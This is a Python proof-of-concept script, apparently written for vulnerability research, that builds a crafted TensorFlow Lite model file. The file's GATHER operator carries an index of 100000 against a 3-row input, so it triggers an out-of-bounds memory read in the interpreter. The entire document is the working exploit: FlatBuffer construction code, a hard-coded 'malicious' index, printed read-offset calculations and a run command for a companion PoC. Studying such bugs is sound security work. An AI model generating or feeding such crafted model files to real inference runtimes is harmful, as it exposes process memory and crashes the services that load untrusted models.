#!/usr/bin/env python3


import struct
import sys


OOB_INDEX = 100000


def build_flatbuffer():
    """Build a minimal .tflite FlatBuffer with a Gather op and OOB index."""
    try:
        from flatbuffers import builder as fb_builder
    except ImportError:
        print("ERROR: flatbuffers Python package not found.")
        print("Install with: pip install flatbuffers")
        sys.exit(1)

    b = fb_builder.Builder(2048)

    # ═══════════════════════════════════════════════════════════════
    # BUFFERS
    # ═══════════════════════════════════════════════════════════════
    # Buffer 0: empty sentinel (required by TFLite spec)
    # Buffer 1: empty (input — allocated at runtime in arena)
    # Buffer 2: coords data = int32 [OOB_INDEX]  ← THE MALICIOUS VALUE
    # Buffer 3: empty (output — allocated at runtime in arena)

    coords_bytes = struct.pack('<i', OOB_INDEX)
    coords_data_vec = b.CreateByteVector(coords_bytes)

    # Buffer 3: empty
    b.StartObject(1)
    buf3 = b.EndObject()

    # Buffer 2: coords constant data
    b.StartObject(1)
    b.PrependUOffsetTRelativeSlot(0, coords_data_vec, 0)
    buf2 = b.EndObject()

    # Buffer 1: empty
    b.StartObject(1)
    buf1 = b.EndObject()

    # Buffer 0: empty sentinel
    b.StartObject(1)
    buf0 = b.EndObject()

    # Buffers vector
    b.StartVector(4, 4, 4)
    b.PrependUOffsetTRelative(buf3)
    b.PrependUOffsetTRelative(buf2)
    b.PrependUOffsetTRelative(buf1)
    b.PrependUOffsetTRelative(buf0)
    buffers_vec = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # TENSOR SHAPES
    # ═══════════════════════════════════════════════════════════════
    # T0 input: [3, 4]  → 3 rows, 4 cols, axis_size=3
    b.StartVector(4, 2, 4)
    b.PrependInt32(4)
    b.PrependInt32(3)
    t0_shape = b.EndVector()

    # T1 coords: [1]  → one index value
    b.StartVector(4, 1, 4)
    b.PrependInt32(1)
    t1_shape = b.EndVector()

    # T2 output: [1, 4]  → one gathered row
    b.StartVector(4, 2, 4)
    b.PrependInt32(4)
    b.PrependInt32(1)
    t2_shape = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # TENSOR NAMES
    # ═══════════════════════════════════════════════════════════════
    t0_name = b.CreateString("input")
    t1_name = b.CreateString("coords")
    t2_name = b.CreateString("output")

    # ═══════════════════════════════════════════════════════════════
    # TENSORS (Tensor table has 10 fields in schema)
    # ═══════════════════════════════════════════════════════════════

    # T2: output [1,4] FLOAT32, buffer=3 (arena-allocated)
    b.StartObject(10)
    b.PrependUOffsetTRelativeSlot(0, t2_shape, 0)
    b.PrependInt8Slot(1, 0, 0)      # FLOAT32 = 0
    b.PrependUint32Slot(2, 3, 0)    # buffer index 3
    b.PrependUOffsetTRelativeSlot(3, t2_name, 0)
    tensor2 = b.EndObject()

    # T1: coords [1] INT32, buffer=2 (constant — points into flatbuffer)
    b.StartObject(10)
    b.PrependUOffsetTRelativeSlot(0, t1_shape, 0)
    b.PrependInt8Slot(1, 2, 0)      # INT32 = 2
    b.PrependUint32Slot(2, 2, 0)    # buffer index 2
    b.PrependUOffsetTRelativeSlot(3, t1_name, 0)
    tensor1 = b.EndObject()

    # T0: input [3,4] FLOAT32, buffer=1 (arena-allocated)
    b.StartObject(10)
    b.PrependUOffsetTRelativeSlot(0, t0_shape, 0)
    b.PrependInt8Slot(1, 0, 0)      # FLOAT32 = 0
    b.PrependUint32Slot(2, 1, 0)    # buffer index 1
    b.PrependUOffsetTRelativeSlot(3, t0_name, 0)
    tensor0 = b.EndObject()

    # Tensors vector
    b.StartVector(4, 3, 4)
    b.PrependUOffsetTRelative(tensor2)
    b.PrependUOffsetTRelative(tensor1)
    b.PrependUOffsetTRelative(tensor0)
    tensors_vec = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # GATHER OPTIONS: { axis: 0, batch_dims: 0 }
    # ═══════════════════════════════════════════════════════════════
    b.StartObject(2)
    b.PrependInt32Slot(0, 0, 0)  # axis = 0
    b.PrependInt32Slot(1, 0, 0)  # batch_dims = 0
    gather_opts = b.EndObject()

    # ═══════════════════════════════════════════════════════════════
    # OPERATOR: GATHER(T0, T1) -> T2
    # ═══════════════════════════════════════════════════════════════
    b.StartVector(4, 2, 4)
    b.PrependInt32(1)
    b.PrependInt32(0)
    op_inputs = b.EndVector()

    b.StartVector(4, 1, 4)
    b.PrependInt32(2)
    op_outputs = b.EndVector()

    b.StartObject(13)
    b.PrependUint32Slot(0, 0, 0)                       # opcode_index = 0
    b.PrependUOffsetTRelativeSlot(1, op_inputs, 0)
    b.PrependUOffsetTRelativeSlot(2, op_outputs, 0)
    b.PrependUint8Slot(3, 23, 0)                        # GatherOptions = 23
    b.PrependUOffsetTRelativeSlot(4, gather_opts, 0)
    operator0 = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(operator0)
    operators_vec = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # SUBGRAPH
    # ═══════════════════════════════════════════════════════════════
    b.StartVector(4, 1, 4)
    b.PrependInt32(0)
    sg_inputs = b.EndVector()

    b.StartVector(4, 1, 4)
    b.PrependInt32(2)
    sg_outputs = b.EndVector()

    sg_name = b.CreateString("main")

    b.StartObject(5)
    b.PrependUOffsetTRelativeSlot(0, tensors_vec, 0)
    b.PrependUOffsetTRelativeSlot(1, sg_inputs, 0)
    b.PrependUOffsetTRelativeSlot(2, sg_outputs, 0)
    b.PrependUOffsetTRelativeSlot(3, operators_vec, 0)
    b.PrependUOffsetTRelativeSlot(4, sg_name, 0)
    subgraph0 = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(subgraph0)
    subgraphs_vec = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # OPERATOR CODE: GATHER = 36
    # ═══════════════════════════════════════════════════════════════
    b.StartObject(4)
    b.PrependInt8Slot(0, 36, 0)     # deprecated_builtin_code = GATHER
    b.PrependInt32Slot(2, 1, 0)     # version = 1
    b.PrependInt32Slot(3, 36, 0)    # builtin_code = GATHER
    opcode0 = b.EndObject()

    b.StartVector(4, 1, 4)
    b.PrependUOffsetTRelative(opcode0)
    opcodes_vec = b.EndVector()

    # ═══════════════════════════════════════════════════════════════
    # MODEL ROOT
    # ═══════════════════════════════════════════════════════════════
    desc = b.CreateString("Gather OOB PoC")

    b.StartObject(5)
    b.PrependUint32Slot(0, 3, 0)                        # version = 3
    b.PrependUOffsetTRelativeSlot(1, opcodes_vec, 0)
    b.PrependUOffsetTRelativeSlot(2, subgraphs_vec, 0)
    b.PrependUOffsetTRelativeSlot(3, desc, 0)
    b.PrependUOffsetTRelativeSlot(4, buffers_vec, 0)
    model = b.EndObject()

    b.Finish(model, b"TFL3")
    return bytes(b.Output())


def main():
    output_path = "malicious_gather.tflite"
    data = build_flatbuffer()

    with open(output_path, "wb") as f:
        f.write(data)

    offset_bytes = OOB_INDEX * 4 * 4  # inner_size=4, sizeof(float)=4
    print(f"[+] Written {len(data)} bytes to {output_path}")
    print(f"[+] Model: GATHER op, input=[3,4] FLOAT32, coords=[{OOB_INDEX}]")
    print(f"[+] axis_size=3, valid indices: 0..2, malicious index: {OOB_INDEX}")
    print(f"[+] OOB read offset: {OOB_INDEX} * 4 * 4 = {offset_bytes:,} bytes")
    print(f"[+] Arena is 200KB → read goes ~{(offset_bytes-200000)//1000}KB past arena")
    print()
    print(f"Build & run:")
    print(f"  ./run_poc_gather {output_path}")


if __name__ == "__main__":
    main()
